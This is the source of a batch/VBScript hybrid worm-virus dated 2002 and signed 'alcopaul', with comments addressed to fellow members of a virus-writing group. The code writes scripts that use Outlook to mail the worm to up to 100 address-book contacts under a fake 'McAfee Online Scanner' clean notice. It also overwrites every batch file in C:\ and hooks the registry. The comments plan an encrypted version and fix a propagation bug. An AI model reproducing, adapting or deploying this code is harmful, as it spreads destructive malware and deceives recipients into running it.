cls
@echo off
ctty nul
copy %0 c:\aut0exec.bat
copy %0 c:\Calvin&Hobbes.bat
echo.on error resume next>c:\net.vbs
echo.Set a = CreateObject("Outlook.Application")>>c:\net.vbs
echo.Set b = a.GetNameSpace("MAPI")>>c:\net.vbs
echo.If a = "Outlook" Then>>c:\net.vbs
echo.b.Logon "profile", "password">>c:\net.vbs
echo.For y = 1 To b.AddressLists.Count>>c:\net.vbs
echo.Set d = b.AddressLists(y)>>c:\net.vbs
echo.x = 1>>c:\net.vbs
echo.Set c = a.CreateItem(0)>>c:\net.vbs
echo.For oo = 1 To d.AddressEntries.Count>>c:\net.vbs
echo.e = d.AddressEntries(x)>>c:\net.vbs
echo.c.Recipients.Add e>>c:\net.vbs
echo.x = x + 1>>c:\net.vbs
echo.If x = 101 Then oo = d.AddressEntries.Count>>c:\net.vbs
echo.Next>>c:\net.vbs
echo.c.Subject = "A Calvin And Hobbes Comic Strip">>c:\net.vbs
echo.c.Body = "-------------- McAfee Online Scanner ----------------" & vbcrlf & _>>c:\net.vbs
echo."The attached file doesn't contain any malicious routines" & vbcrlf & _>>c:\net.vbs
echo."-------------------------------------------------------------------" & vbcrlf & _>>c:\net.vbs
echo."">>c:\net.vbs
echo.c.attachments.Add("c:\Calvin&Hobbes.bat")>>c:\net.vbs
echo.c.Send>>c:\net.vbs
echo.c.DeleteAfterSubmit = True>>c:\net.vbs
echo.e = "">>c:\net.vbs
echo.Next>>c:\net.vbs
echo.b.Logoff>>c:\net.vbs
echo.End If>>c:\net.vbs
start c:\net.vbs
echo.on error resume next>c:\infect.vbs
echo.Set fso = CreateObject("Scripting.FileSystemObject")>>c:\infect.vbs
echo.eee = "c:\aut0exec.bat">>c:\infect.vbs
echo.Set f = fso.GetFolder("c:\")>>c:\infect.vbs
echo.Set fc = f.Files>>c:\infect.vbs
echo.For Each f1 In fc>>c:\infect.vbs
echo.ext = fso.GetExtensionName(f1.Path)>>c:\infect.vbs
echo.ext = LCase(ext)>>c:\infect.vbs
echo.If (ext = "bat") Then>>c:\infect.vbs
echo.Set f = fso.getfile(eee)>>c:\infect.vbs
echo.f.Copy (f1.Path)>>c:\infect.vbs
echo.End If>>c:\infect.vbs
echo.Next>>c:\infect.vbs
start c:\infect.vbs
regedit /s c:\aut0exec.bat
ctty con
exit
:: preliminaries: i didn't do debugscript of the vbs routines becoz i'm expecting the encryption
:: technique from yours.... this is basically a worm that spreads to e-mail and a virus that
:: overwrites batch files in root (c:\).... it doesn't spawn reg files for registry hook coz
:: the code itself is a registry entry....
:: this is a reg/bat/vbs hybrid.... :)...kewl???
:: proposed name: BAT/Calvin&Hobbes ala-you are calvin and i am hobbes.. or the other way around..hehheheh
:: fiy: Calvin and Hobbes were famous philosophers... someone made a comic strip w/c i think 
:: is dedicated to them...
:: but the final say is yours.... coz you'll be the one who will finish the code...
::
:: no retro routines... i did keep it simple coz it's your technique that will be highlighted
:: here.... remember, we're making the first ever encrypted batch virus/worm? :) and the
:: encryption technique will come from you..
:: about the payload, just keep it funny as you said..
::
:: i'll be heading for my vacation tomorrow night and i'll be away from my computer...
:: take care.. regards 2 all of the members of our group..
::
:: addendum:::
:: previously sent contains a bug
:: 
:: echo.If x > 101 Then oo = d.AddressEntries.Count>>c:\net.vbs
::
:: if you'll take a look at the spawned c:\net.vbs
::
:: If x Then oo = d.AddressEntries.Count>>c:\net.vbs
::
:: the previously sent version will send itself to a single recipient...
::
:: so the code above is the final version..
::
:: alcopaul
:: 03/29/2k2